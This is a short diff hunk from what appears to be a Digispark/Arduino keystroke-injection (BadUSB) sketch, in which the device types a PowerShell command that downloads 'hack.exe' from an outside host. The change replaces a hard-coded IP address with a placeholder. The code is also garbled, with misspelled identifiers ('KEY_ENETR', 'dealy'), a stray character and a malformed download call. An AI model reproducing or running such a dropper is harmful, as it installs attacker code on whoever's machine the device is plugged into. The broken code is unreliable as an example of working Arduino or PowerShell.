@@ -22,7 +22,7 @@ void loop() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.SendKeyStroke(KEY_ENETR);
   DigiKeyboard.delay(1000);r
-  DigiKeyboard.print(" $webClient.DownloadFile.('http:192.168.10.10/hack.exe','hack.exe')"); //Used to download the file from the target IP address
+  DigiKeyboard.print(" $webClient.DownloadFile.('http:ip.address/hack.exe','hack.exe')"); //Used to download the file from the target IP address
   DigiKeyboard.delay(1000);
   DigiKeyboard.SendKeyStroke(KEY_ENTER);
   DigiKeyboard.dealy(8000);
